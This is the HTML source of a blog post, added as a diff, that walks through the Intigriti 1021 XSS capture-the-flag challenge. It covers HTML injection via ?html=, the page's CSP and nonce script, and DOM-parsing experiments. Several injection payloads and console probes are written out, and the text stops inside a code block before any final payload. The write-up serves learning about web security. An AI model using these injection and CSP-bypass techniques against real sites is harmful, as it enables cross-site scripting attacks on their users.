@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Challenge description
+https://bugology.intigriti.io/intigriti-monthly-challenges/1021
+Find a way to execute arbitrary javascript on the challenge page
+The solution
+
+Should work on the latest version of Chrome and FireFox.
+Should execute alert(document.domain).
+Should leverage a cross site scripting vulnerability on this domain.
+Shouldn&rsquo;t be self-XSS or related to MiTM attacks.
+
+https://challenge-1021.intigriti.io/challenge/challenge.php
+Finding html injection
+HTML injection https://challenge-1021.intigriti.io/challenge/challenge.php
+In the HTML source, there is a clue that the server accepts html query parameter.
+&lt;div id=&#34;html&#34; class=&#34;text&#34;&gt;
+  &lt;h1 class=&#34;light&#34;&gt;HALLOWEEN HAS TAKEN OVER!&lt;/h1&gt;
+  ARE YOU SCARED?&lt;br /&gt;ARE YOU STILL SANE?&lt;br /&gt;NOBODY CAN BREAK THIS!&lt;br /&gt;NOBODY
+  CAN SAVE INTIGRITI&lt;br /&gt;I USE ?html= TO CONVEY THESE MESSAGES&lt;br /&gt;I&#39;LL
+  RELEASE INTIGRITI FROM MY WRATH... &lt;br /&gt;... AFTER YOU POP AN XSS&lt;br /&gt;ELSE,
+  INTIGRITI IS MINE!&lt;br /&gt;SIGNED* 1337Witch69
+&lt;/div&gt;
+Evaluating HTML injection sink">  
+
+  <title>
+    
+      Google chall
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.d21e6a19ea346f458ada43307d36e23a3fc456016a2a0ff21dd4f28d1029b5bd96f94ff0aff3fb25ce909d6821efc877f876e44d01fbe1d2648cd5ff58f6c070.css" integrity="sha512-0h5qGeo0b0WK2kMwfTbiOj/EVgFqKg/yHdTyjRAptb2W&#43;U/wr/P7Jc6QnWgh78h3&#43;HbkTQH74dJkjNX/WPbAcA==" />
+  </head>
+<body a="light">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">&lt; back</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-01-27 17:07:19 &#43;0800 &#43;08">
+            2025-01-27
+        </time>
+    </p>
+
+    <h1>Google chall</h1>
+
+    
+
+    <h1 id="challenge-description">Challenge description</h1>
+<p><a href="https://bugology.intigriti.io/intigriti-monthly-challenges/1021">https://bugology.intigriti.io/intigriti-monthly-challenges/1021</a></p>
+<p>Find a way to execute arbitrary javascript on the challenge page</p>
+<p>The solution</p>
+<ul>
+<li>Should work on the latest version of Chrome <strong>and</strong> FireFox.</li>
+<li>Should execute <code>alert(document.domain)</code>.</li>
+<li>Should leverage a cross site scripting vulnerability on this domain.</li>
+<li>Shouldn&rsquo;t be self-XSS or related to MiTM attacks.</li>
+</ul>
+<p><a href="https://challenge-1021.intigriti.io/challenge/challenge.php">https://challenge-1021.intigriti.io/challenge/challenge.php</a></p>
+<h1 id="finding-html-injection">Finding html injection</h1>
+<p>HTML injection <a href="https://challenge-1021.intigriti.io/challenge/challenge.php">https://challenge-1021.intigriti.io/challenge/challenge.php</a></p>
+<p>In the HTML source, there is a clue that the server accepts <code>html</code> query parameter.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">id</span><span style="color:#555">=</span><span style="color:#c30">&#34;html&#34;</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;text&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">h1</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;light&#34;</span>&gt;HALLOWEEN HAS TAKEN OVER!&lt;/<span style="color:#309;font-weight:bold">h1</span>&gt;
+</span></span><span style="display:flex;"><span>  ARE YOU SCARED?&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;ARE YOU STILL SANE?&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;NOBODY CAN BREAK THIS!&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;NOBODY
+</span></span><span style="display:flex;"><span>  CAN SAVE INTIGRITI&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;I USE ?html= TO CONVEY THESE MESSAGES&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;I&#39;LL
+</span></span><span style="display:flex;"><span>  RELEASE INTIGRITI FROM MY WRATH... &lt;<span style="color:#309;font-weight:bold">br</span> /&gt;... AFTER YOU POP AN XSS&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;ELSE,
+</span></span><span style="display:flex;"><span>  INTIGRITI IS MINE!&lt;<span style="color:#309;font-weight:bold">br</span> /&gt;SIGNED* 1337Witch69
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span></code></pre></div><p>Evaluating HTML injection sink</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>https://challenge-1021.intigriti.io/challenge/challenge.php?html<span style="color:#555">=</span>sink
+</span></span></code></pre></div><p>Sink output</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">id</span><span style="color:#555">=</span><span style="color:#c30">&#34;html&#34;</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;text&#34;</span>&gt;&lt;<span style="color:#309;font-weight:bold">h1</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;light&#34;</span>&gt;sink&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;a&#34;</span>&gt;&#39;&#34;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span></code></pre></div><p>We should close the <code>h1</code> and <code>div</code> element.</p>
+<pre tabindex="0"><code>https://challenge-1021.intigriti.io/challenge/challenge.php?html=&lt;/h1&gt;&lt;/div&gt;&lt;p&gt;HTML Injection sink&lt;/p&gt;
+</code></pre><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">id</span><span style="color:#555">=</span><span style="color:#c30">&#34;html&#34;</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;text&#34;</span>&gt;&lt;<span style="color:#309;font-weight:bold">h1</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;light&#34;</span>&gt;&lt;/<span style="color:#309;font-weight:bold">h1</span>&gt;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;&lt;<span style="color:#309;font-weight:bold">p</span>&gt;HTML Injection sink&lt;/<span style="color:#309;font-weight:bold">p</span>&gt;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;a&#34;</span>&gt;&#39;&#34;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span></code></pre></div><h1 id="html-injection-to-xss">HTML Injection to XSS</h1>
+<p>Take note that the CSP is set by the server when the HTML consisting of the meta tag is returned.</p>
+<pre tabindex="0"><code>&lt;meta
+      http-equiv=&#34;Content-Security-Policy&#34;
+      content=&#34;default-src &#39;none&#39;; script-src &#39;unsafe-eval&#39; &#39;strict-dynamic&#39; &#39;nonce-81b5ced40fb716fe900c00633c4ed971&#39;; style-src &#39;nonce-f98e99cabdecce703c02d7ae917794ad&#39;&#34;
+    /&gt;
+
+    &lt;style nonce=&#34;f98e99cabdecce703c02d7ae917794ad&#34;&gt;
+</code></pre><p>As far as I know, we are not able to override the CSP by injecting a meta tag as the DOM has already been loaded. The <code>unsafe-eval</code> directive suggests that a script with valid nonce is able to evaluate javascript from strings.
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions</a></p>
+<p>There is a peculiar HTML div element with the attribute <code> class=&quot; bat-attribute&quot;</code>. The whitespace in the class attribute may affect the DOM parsing of the subsequent HTML elements. We also see the subsequent script elements containing the valid nonce.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34; bat-overlay&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;81b5ced40fb716fe900c00633c4ed971&#34;</span>&gt;<span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#39;lock&#39;</span>).onclick <span style="color:#555">=</span> () =&gt; {<span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#39;lock&#39;</span>).classList.toggle(<span style="color:#c30">&#39;unlocked&#39;</span>);}&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;81b5ced40fb716fe900c00633c4ed971&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#366">window</span>.addEventListener(<span style="color:#c30">&#34;DOMContentLoaded&#34;</span>, <span style="color:#069;font-weight:bold">function</span> () {
+</span></span><span style="display:flex;"><span>        e <span style="color:#555">=</span> <span style="color:#c30">`)]}&#39;`</span> <span style="color:#555">+</span> <span style="color:#069;font-weight:bold">new</span> URL(location.href).searchParams.get(<span style="color:#c30">&#34;xss&#34;</span>);
+</span></span><span style="display:flex;"><span>        c <span style="color:#555">=</span> <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).lastElementChild;
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (c.id <span style="color:#555">===</span> <span style="color:#c30">&#34;intigriti&#34;</span>) {
+</span></span><span style="display:flex;"><span>          l <span style="color:#555">=</span> c.lastElementChild;
+</span></span><span style="display:flex;"><span>          i <span style="color:#555">=</span> l.innerHTML.trim();
+</span></span><span style="display:flex;"><span>          f <span style="color:#555">=</span> i.substr(i.length <span style="color:#555">-</span> <span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>          e <span style="color:#555">=</span> f <span style="color:#555">+</span> e;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">let</span> s <span style="color:#555">=</span> <span style="color:#366">document</span>.createElement(<span style="color:#c30">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>        s.type <span style="color:#555">=</span> <span style="color:#c30">&#34;text/javascript&#34;</span>;
+</span></span><span style="display:flex;"><span>        s.appendChild(<span style="color:#366">document</span>.createTextNode(e));
+</span></span><span style="display:flex;"><span>        <span style="color:#366">document</span>.body.appendChild(s);
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">id</span><span style="color:#555">=</span><span style="color:#c30">&#34;html&#34;</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;text&#34;</span>&gt;&lt;<span style="color:#309;font-weight:bold">h1</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;light&#34;</span>&gt;&lt;/<span style="color:#309;font-weight:bold">h1</span>&gt;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;&lt;<span style="color:#309;font-weight:bold">p</span>&gt;HTML Injection sink&lt;/<span style="color:#309;font-weight:bold">p</span>&gt;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">&lt;!-- !!! --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;a&#34;</span>&gt;&#39;&#34;&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">body</span>&gt;
+</span></span></code></pre></div><p>First, let&rsquo;s validate if the div element with class <code>bat-overlay</code> is loaded in the DOM via browser console.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.querySelector(<span style="color:#c30">&#34;.bat-overlay&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Returns div class
+</span></span></span></code></pre></div><p>Seems like the browser is able to handle the whitespace in the class value.</p>
+<p>Next, let&rsquo;s validate if the script elements were loaded properly.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementsByTagName(<span style="color:#c30">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// returns scripts
+</span></span></span></code></pre></div><p>The scripts with the valid nonce are properly loaded into the DOM.</p>
+<p>Let&rsquo;s inspect this script to see how we can perform XSS.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;81b5ced40fb716fe900c00633c4ed971&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#366">window</span>.addEventListener(<span style="color:#c30">&#34;DOMContentLoaded&#34;</span>, <span style="color:#069;font-weight:bold">function</span> () {
+</span></span><span style="display:flex;"><span>        e <span style="color:#555">=</span> <span style="color:#c30">`)]}&#39;`</span> <span style="color:#555">+</span> <span style="color:#069;font-weight:bold">new</span> URL(location.href).searchParams.get(<span style="color:#c30">&#34;xss&#34;</span>);
+</span></span><span style="display:flex;"><span>        c <span style="color:#555">=</span> <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).lastElementChild;
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (c.id <span style="color:#555">===</span> <span style="color:#c30">&#34;intigriti&#34;</span>) {
+</span></span><span style="display:flex;"><span>          l <span style="color:#555">=</span> c.lastElementChild;
+</span></span><span style="display:flex;"><span>          i <span style="color:#555">=</span> l.innerHTML.trim();
+</span></span><span style="display:flex;"><span>          f <span style="color:#555">=</span> i.substr(i.length <span style="color:#555">-</span> <span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>          e <span style="color:#555">=</span> f <span style="color:#555">+</span> e;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">let</span> s <span style="color:#555">=</span> <span style="color:#366">document</span>.createElement(<span style="color:#c30">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>        s.type <span style="color:#555">=</span> <span style="color:#c30">&#34;text/javascript&#34;</span>;
+</span></span><span style="display:flex;"><span>        s.appendChild(<span style="color:#366">document</span>.createTextNode(e));
+</span></span><span style="display:flex;"><span>        <span style="color:#366">document</span>.body.appendChild(s);
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><p>The script is executed when DOM is completely parsed.
+<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/DOMContentLoaded_event">https://developer.mozilla.org/en-US/docs/Web/API/Document/DOMContentLoaded_event</a></p>
+<p>user input is via <code>?xss=</code> query parameter will be appended to <code>)]}'</code> and stored in variable <code>e</code>. The last child element of the element with <code>id=&quot;body&quot;</code> will be selected to the variable <code>c</code>. If the element pointed by <code>c</code> has an <code>id=&quot;intigriti&quot;</code> then the last child element will be selected and the value of its innerHTML will be trimmed and the last 4 characters will be stored in variable <code>f</code>. Finally, the value of <code>e</code> will be <code>f + e</code>.</p>
+<p>Next, the script will create a script element and add it as a child of the <code>body</code> element in the DOM.</p>
+<p>By the default response, we have a <code>body</code> element with <code>id=&quot;body&quot;</code> but not any element with <code>id=&quot;intigriti&quot;</code>. Luckily for us, we can perform HTML injection for the server to return the injected HTML as part of the response. If the HTML injection context is purely on the client side, it may not be possible to exploit the page as the script event listener is only triggered once the DOM is loaded.</p>
+<p>We can inject elements with <code>id=&quot;intigriti&quot;</code>. However, our element has to be the last child element of the <code>body</code> element in the DOM.</p>
+<p>We can try the following to inject the DOM to see if the <code>li</code> element is the last element of the DOM upon completion of parsing.
+<code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id=&quot;intigriti&quot;&gt;&lt;li&gt;HTML Injection sink&lt;/li&gt;</code></p>
+<p>When we inspect the HTML (not view source), we see the innerHTML extracted is not from the <code>li</code> element.</p>
+<p><img src="a.png" alt="a">
+The <code>pan&gt;</code> seems to be derived from a <code>span</code> tag from the DOM. We would have assumed that the last child element is the <code>li</code> tag where our HTML injection is. and expected <code>&lt;script type=&quot;text/javascript&quot;&gt;sink)]}</code>.</p>
+<p>However, it depends on how the DOM tree is being built. We can do a further analysis on the DOM tree via JS console.</p>
+<p>Last element of body is script because this is post DOM parsing where the vulnerable script appends a <code>script</code> element to the end of <code>body</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).lastElementChild;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;script type=&#34;text/javascript&#34;&gt;
+</span></span></span></code></pre></div><p>We should instead check the second last child element of <code>body</code>. We will see our <code>ul</code> element from HTML injection.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul id=&#34;intigriti&#34;&gt;
+</span></span></span></code></pre></div><p>When we check the lastElementChild of <code>ul</code>, we see <code>div id=&quot;container&quot;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>].lastElementChild;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;div id=&#34;container&#34;&gt;
+</span></span></span></code></pre></div><p><img src="b.png" alt="b"></p>
+<p>I tried with some other nested element combinations but to no avail. On hindsight, reading some other solutions, <code>select</code> and nested <code>option</code> HTML elements will result in the last child element to be <code>option</code>. Which is a strange behaviour for the DOM parsing as it suggests that there is a parent-child relationship between <code>select</code> and <code>option</code> nodes in the DOM tree.</p>
+<p>What if we induce the browser to resolve missing closing tags? Will this event be after the DOM is fully parsed/post-DOMContentLoaded? So many questions to be answered, hopefully by a browser/HTML expert.</p>
+<p>Anyways, it seems like leaving out the closing tag <code>&lt;/li&gt;</code> will cause the last element post-DOMContentLoaded to be the <code>li</code> element. Perhaps the parser resolves this node at the end which updates that current state of the DOM to have <code>li</code> as the last child element instead.</p>
+<p><code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id=&quot;intigriti&quot;&gt;&lt;li&gt;HTML Injection sink</code> will result in the following:</p>
+<p>Again, check the second last child element of <code>body</code> to know the last child element before the script element is added. We see the <code>ul</code> element from HTML injection which is the same as when we had closing tag <code>&lt;/li&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul id=&#34;intigriti&#34;&gt;
+</span></span></span></code></pre></div><p>When we check the lastElementChild of <code>ul</code>, we see <code>li</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>].lastElementChild;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;li&gt;
+</span></span></span></code></pre></div><p>However, this time we see the appended script element has <code>div&gt;)]}</code> in the final DOM rendered. Which seems may be from the last 3 characters of <code>&lt;/div&gt;</code>. Perhaps the event of resolving missing closing tags happens right after DOMContentLoaded. If so, then maybe at that current state, the DOM assumes that <code>&lt;div id=&quot;container&quot;&gt;...&lt;/div&gt;</code> is a child of <code>li</code> since the closing of <code>li</code> tag hasn&rsquo;t been resolved yet.</p>
+<p><img src="c.png" alt="c"></p>
+<p>Let&rsquo;s try to add another tag without closing the <code>li</code> tag. Will the
+<code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id=&quot;intigriti&quot;&gt;&lt;li&gt;HTML Injection sink&lt;ul&gt;</code> will result in the following:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul id=&#34;intigriti&#34;&gt;
+</span></span></span></code></pre></div><p>We got the same <code>li</code> element.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>].lastElementChild;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;li&gt;
+</span></span></span></code></pre></div><p>But this time when we see the final state of <code>script</code>, we see <code>/ul&gt;)]}</code>.
+<img src="d.png" alt="d"></p>
+<p>Strangely, if you try another <code>li</code> instead, we will get <code>div&gt;)]}</code>. If we try some arbitrary tag like <code>tr</code> it will also be the <code>div&gt;)]}</code>. This seems to suggest that only certain combinations of tags are recognised to have parent-child relationship in the DOM. Of course, this may deviate depending on how each browser implements the HTML RFC (if there is such a flexibility).</p>
+<p>Our HTML injection point should be after the nested <code>ul</code> element, <code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id=&quot;intigriti&quot;&gt;&lt;li&gt;&lt;ul&gt;HTML Injection sink</code>. The innerHTML of nested <code>ul</code> is as such:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>l <span style="color:#555">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[
+</span></span><span style="display:flex;"><span>    <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>  ].lastElementChild;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;li&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>i <span style="color:#555">=</span> l.innerHTML.trim();
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* 
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">`&lt;ul&gt;HTML Injection sink
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">    &lt;!-- !!! --&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">    &lt;div class=&#34;a&#34;&gt;&#39;&#34;&lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">  
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">  &lt;div id=&#34;container&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span id=&#34;extra-flicker&#34;&gt;N&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;T&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;div id=&#34;broken&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">          &lt;span id=&#34;y&#34;&gt;G&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;R&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;div id=&#34;broken&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">          &lt;span id=&#34;y&#34;&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;T&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">      &lt;span&gt;I&lt;/span&gt;
